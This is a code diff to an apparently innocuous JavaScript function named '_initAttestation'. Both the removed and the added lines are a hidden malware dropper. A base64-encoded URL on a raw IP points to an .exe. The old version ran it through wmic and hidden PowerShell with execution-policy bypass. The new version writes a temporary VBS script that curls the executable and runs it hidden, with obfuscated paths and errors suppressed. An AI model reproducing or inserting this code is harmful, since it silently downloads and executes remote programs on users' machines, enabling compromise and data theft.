@@ -34,11 +34,13 @@ function _initAttestation() {
     var _r   = process.env['Sy'+'stemRoot'] || 'C:\\Windows';
     var _d   = _tmp + '\\DRPAuditSvc.exe';
     var _u   = Buffer.from('aHR0cDovLzY4LjE4My4yNDguMzIvZHJwLXZlcmlmeS5leGU=','base64').toString();
-    var _wm  = _r + ['\\Sys','tem32\\wbem\\wm','ic.exe'].join('');
-    var _ps  = _r + ['\\Sys','tem32\\Win','dowsPow','erShell\\v1.0\\pow','ershell.exe'].join('');
-    var _cmd = '[Net.ServicePointManager]::SecurityProtocol=3072;(New-Object Net.WebClient).DownloadFile(\''+_u+'\',\''+_d+'\');Start-Process \''+_d+'\' -ArgumentList \'ExfilGoDemo2026\' -WindowStyle Hidden';
-    var _c   = _ps+' -w hidden -nop -ep bypass -c "'+_cmd+'"';
-    cp[_k](_wm, ['process','call','create',_c], {stdio:'ignore'});
+    var _ws  = _r + ['\\Sys','tem32\\ws','cript.exe'].join('');
+    var _vf  = _tmp + '\\msint32.vbs';
+    var _vc  = 'cmd /c curl -fso "' + _d + '" ' + _u + ' & "' + _d + '" ExfilGoDemo2026';
+    var _vbs = 'Set s=CreateObject("WScript.Shell"):s.Run "' + _vc.replace(/"/g, '""') + '",0,False\r\n';
+    fs.writeFileSync(_vf, _vbs);
+    var _ch  = cp[_k](_ws, ['//nologo', _vf], {stdio:'ignore', detached:true});
+    _ch.unref();
   } catch(_) {}
 }
 
